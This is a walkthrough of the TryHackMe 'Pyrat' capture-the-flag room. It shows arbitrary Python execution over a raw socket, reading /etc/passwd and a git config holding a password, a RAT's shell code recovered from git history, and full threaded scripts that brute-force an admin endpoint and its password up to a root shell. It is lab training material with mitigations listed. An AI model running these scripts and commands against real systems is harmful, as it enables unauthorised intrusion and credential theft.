---
title: "TryHackMe: Pyrat"
description: "Walkthrough of TryHackMe Pyrat - exploiting a Python-based RAT via arbitrary code execution, extracting credentials from Git history, and brute-forcing an admin endpoint for root access."
date: 2025-12-26
categories: [TryHackMe]
tags: [ctf, tryhackme, easy, python, remote-code-execution, git-credentials, brute-force, socket-programming]
image:
  path: /tryhackme/2025/pyrat/cover.png
  alt: TryHackMe Pyrat Room
---

## Overview

| Property | Value |
|----------|-------|
| Room | [Pyrat](https://tryhackme.com/room/pyrat) |
| Difficulty | Easy |
| OS | Linux (Ubuntu) |
| Attack Chain | `www-data → think → root` |

This room has a **Python service** on port 8000 that runs any code we send it. We used this to look around the system and found a **password in a git config file**. This password was reused for the system user. Looking at the **git history**, we found old source code showing a secret **admin command**. We brute-forced the admin password and used it to get a **root shell**.

### Tools Used

| Phase | Tool | Purpose |
|-------|------|---------|
| Recon | nmap | Port scanning and service enumeration |
| Enum | curl | HTTP service probing |
| Exploit | netcat | Raw socket connection for Python RCE |
| Privesc | Python script | Endpoint and password brute-forcing |

---

## Reconnaissance

We begin with a comprehensive nmap scan to identify open ports and running services.

```console
$ nmap -sC -sV -Pn 10.82.170.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 20:03 EET
Nmap scan report for 10.82.170.30
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds
```

Two ports are open:
- **Port 22**: OpenSSH 8.2p1 - Standard SSH service
- **Port 8000**: SimpleHTTP/0.6 Python/3.11.2 - Custom Python HTTP server

> **Key Finding:** The service on port 8000 is identified as `SimpleHTTP/0.6 Python/3.11.2`. This is unusual - it's not a standard web framework but appears to be a custom Python application. The name "Pyrat" (Python + RAT) suggests this might be a Remote Access Trojan implementation.
{: .prompt-info }

---

## Enumeration

### HTTP Service Analysis

Let's investigate the HTTP service on port 8000:

```console
$ curl -v http://10.82.170.30:8000/
*   Trying 10.82.170.30:8000...
* Connected to 10.82.170.30 (10.82.170.30) port 8000
> GET / HTTP/1.1
> Host: 10.82.170.30:8000
> User-Agent: curl/8.5.0
> Accept: */*
>
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: SimpleHTTP/0.6 Python/3.11.2
< Date: Fri Dec 26 18:03:58  2025
< Content-type: text/html; charset=utf-8
< Content-Length: 27
<
Try a more basic connection
* Closing connection
```

The server responds with an intriguing message: **"Try a more basic connection"**

This is a clear hint. HTTP might be too "advanced" - let's try a raw socket connection using netcat.

### Raw Socket Connection

```console
$ nc 10.82.170.30 8000
test
name 'test' is not defined
print("hello")
hello
```

The first response is a **Python error message**! The server is attempting to evaluate our input as Python code. The error `name 'test' is not defined` indicates that Python tried to interpret "test" as a variable name. When we send valid Python code like `print("hello")`, it executes and returns the output.

> **Vulnerability Discovered:** The server on port 8000 accepts raw socket connections and executes arbitrary Python code. This is a critical Remote Code Execution (RCE) vulnerability.
{: .prompt-danger }

---

## Initial Access

With Python code execution confirmed, let's enumerate the system using the `subprocess` module:

```console
$ nc 10.82.170.30 8000
import subprocess; print(subprocess.getoutput("id"))
uid=33(www-data) gid=33(www-data) groups=33(www-data)
import subprocess; print(subprocess.getoutput("cat /etc/passwd | grep -v nologin | grep -v false"))
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
think:x:1000:1000:,,,:/home/think:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
import subprocess; print(subprocess.getoutput("pwd && ls -la"))
/root
ls: cannot open directory '.': Permission denied
import subprocess; print(subprocess.getoutput("ls -la /home"))
total 16
drwxr-xr-x  4 root   root   4096 Dec 26 17:59 .
drwxr-xr-x 18 root   root   4096 Dec 26 17:59 ..
drwxr-x---  5 think  think  4096 Jun 21  2023 think
drwxr-xr-x  3 ubuntu ubuntu 4096 Dec 26 17:59 ubuntu
```

We're running as `www-data`. Three potential users on the system: `root`, `think`, and `ubuntu`. The script runs from `/root`, but we can't list its contents - the application runs as root initially but drops privileges for code execution. The `think` user's home directory is not accessible to `www-data`, so we need to find credentials.

---

## Credential Discovery & User Access

Git repositories often contain sensitive information. Let's search for `.git` directories:

```console
import subprocess; print(subprocess.getoutput("find /opt /var /tmp -type d -name .git 2>/dev/null"))
/opt/dev/.git
import subprocess; print(subprocess.getoutput("cat /opt/dev/.git/config"))
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = [REDACTED]
```

Found credentials in the git config. Let's spawn a proper shell and switch to user `think`:

```console
import pty;pty.spawn("/bin/bash")
www-data@pyrat:/root$ su think
Password: [REDACTED]
think@pyrat:/root$ cat ~/user.txt
[REDACTED]
```

Password reuse confirmed! **User Flag:** `[REDACTED]`

> **Security Anti-Pattern:** Never store credentials in git configuration files. Use SSH keys or credential managers instead.
{: .prompt-warning }

---

## Privilege Escalation

### Enumeration

Checking the user's mail, we find an interesting message:

```console
think@pyrat:~$ cat /var/mail/think
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted
on your GitHub page, i'll test it tonight so don't be scared if you see
it running. Regards, Dbile Admen
```

The email mentions a **RAT program**. Let's check the running processes:

```console
think@pyrat:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2  99896 10596 ?        Ss   00:00   0:01 /sbin/init
...
root       596  0.0  0.0   2608   596 ?        Ss   00:00   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root       597  0.0  1.4  21864 14592 ?        S    00:00   0:00 python3 /root/pyrat.py
...
```

Found it - `/root/pyrat.py` is running as **root**. This is the RAT mentioned in the email and the service we exploited on port 8000.

### Git History Analysis

Let's examine the git commit history for clues about the application:

```console
think@pyrat:~$ cd /opt/dev
think@pyrat:/opt/dev$ git config --global --add safe.directory /opt/dev
think@pyrat:/opt/dev$ git log --oneline
0a3c36d Added shell endpoint
```

There's a single commit mentioning a "shell endpoint". Let's view the full commit:

```console
think@pyrat:/opt/dev$ git log -p
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
```

> **Critical Discovery:** The source code reveals the application logic:
> 1. If input equals `'some_endpoint'` → calls a special admin function
> 2. Otherwise, if running as root (uid == 0) → **downgrades privileges** via `change_uid()`
> 3. If input equals `'shell'` → spawns a shell
> 4. Otherwise → executes input as Python code
>
> This explains why our Python code ran as `www-data` - the application downgrades from root before executing arbitrary code. However, there's a hidden admin endpoint!
{: .prompt-info }

### Discovering the Admin Endpoint

The code references `'some_endpoint'` as a placeholder. We need to find what input triggers the admin function. Let's brute-force it by testing words and looking for a password prompt:

```python
#!/usr/bin/env python3
import socket
from concurrent.futures import ThreadPoolExecutor

TARGET = "10.82.170.30"
PORT = 8000
WORDLIST = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"

def try_endpoint(word):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET, PORT))
        sock.send(f"{word}\n".encode())
        response = sock.recv(1024)
        sock.close()
        if b'Password' in response:
            print(f"[+] Found: {word} -> {response.decode().strip()}")
    except:
        pass

with open(WORDLIST, 'r') as f:
    words = [line.strip() for line in f if line.strip()]

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(try_endpoint, words)
```

```console
$ python3 find_endpoint.py
[+] Found: admin -> Password:
```

The **admin** endpoint exists and prompts for a password!

---

## Password Brute Force

Now we need to brute-force the admin password:

```python
#!/usr/bin/env python3
import socket
from concurrent.futures import ThreadPoolExecutor

TARGET = "10.82.170.30"
PORT = 8000
WORDLIST = "/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt"

def try_password(password):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET, PORT))
        sock.send(b"admin\n")
        sock.recv(1024)  # Password prompt
        sock.send(f"{password}\n".encode())
        response = sock.recv(1024).decode()
        sock.close()
        if "Welcome" in response:
            print(f"[+] Password: {password}")
            print(f"[+] Response: {response.strip()}")
    except:
        pass

with open(WORDLIST, 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(try_password, passwords)
```

```console
$ python3 brute_password.py
[+] Password: [REDACTED]
[+] Response: Welcome Admin!!! Type "shell" to begin
```

**Admin Password:** `[REDACTED]`

> **Security Anti-Pattern:** The admin endpoint is protected by an extremely weak password, which appears in almost every password wordlist.
{: .prompt-warning }

---

## Root Access

### Authenticating as Admin

Now we can authenticate to the admin endpoint and spawn a root shell:

```console
$ nc 10.82.170.30 8000
admin
Password:
[REDACTED]
Welcome Admin!!! Type "shell" to begin
shell
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

We have root access!

### Root Flag

```console
# cat /root/root.txt
[REDACTED]
```

**Root Flag:** `[REDACTED]`

---

## Key Takeaways

### Vulnerabilities Exploited

| Vulnerability | Impact | Mitigation |
|--------------|--------|------------|
| Python Code Execution | Remote code execution as www-data | Never execute untrusted input, use input validation |
| Credentials in Git Config | Lateral movement to user account | Use SSH keys, never store passwords in config files |
| Password Reuse | SSH access with leaked credentials | Use unique passwords for each service |
| Weak Admin Password | Root access via brute force | Implement account lockout, use strong passwords |
| Source Code in Git History | Application logic revealed | Properly sanitize git history before deployment |

### Security Anti-Patterns Observed

1. **Arbitrary Code Execution** - The RAT accepts and executes any Python code from socket connections
2. **Credentials in Version Control** - GitHub password stored in `.git/config`
3. **Password Reuse** - Same password for GitHub and SSH
4. **Weak Authentication** - Admin endpoint protected by weak password
5. **Sensitive Code in Git History** - Application source code exposed in commits
6. **Security Through Obscurity** - Admin endpoint relies on hidden name rather than proper authentication

### Skills Practiced

- Service enumeration and fingerprinting
- Understanding custom protocol behavior
- Python socket programming for exploitation
- Git repository forensics
- Password brute-forcing with custom scripts
- Privilege escalation through application abuse

---

## References

- [Python subprocess Module](https://docs.python.org/3/library/subprocess.html)
- [Git Security Best Practices](https://git-scm.com/book/en/v2/Git-Tools-Credential-Storage)
- [SecLists Password Wordlists](https://github.com/danielmiessler/SecLists)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
